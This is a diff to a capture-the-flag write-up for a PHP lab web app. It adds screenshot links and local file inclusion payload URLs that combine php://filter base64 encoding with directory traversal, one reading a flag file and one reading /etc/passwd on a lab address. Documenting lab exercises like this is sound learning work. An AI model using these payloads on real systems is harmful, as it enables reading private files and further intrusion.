@@ -88,12 +88,20 @@ Web App are adding .php extension in all the querys.
 
 **Other FFUF**
 
-
+![image](https://user-images.githubusercontent.com/79543461/176443978-851bd070-272b-47cb-9d54-cde62d16e1d5.png)
 
 **Flag**
 
 ![image](https://user-images.githubusercontent.com/79543461/176402871-df440e00-01e7-479e-9cac-10131e797a06.png)
 
+![image](https://user-images.githubusercontent.com/79543461/176444149-15725303-a6ab-47dd-ba1a-6fab61e0277f.png)
+
 **Seeing index.php code• i see ext paramter expected in GET request.**
 
 http://10.10.64.213/?view=php://filter/convert.base64-encode/resource=dog/../flag&ext=.php == WORKS GOOD
+
+http://10.10.24.8/?view=php://filter/convert.base64-encode/resource=dog/../../../../&ext=etc/passwd == **WORKS GOOD!!!!!!!!**
+
+**/etc/passwd**
+
+![image](https://user-images.githubusercontent.com/79543461/176447685-600e98e5-7d55-4958-9d1e-9e829096cef8.png)
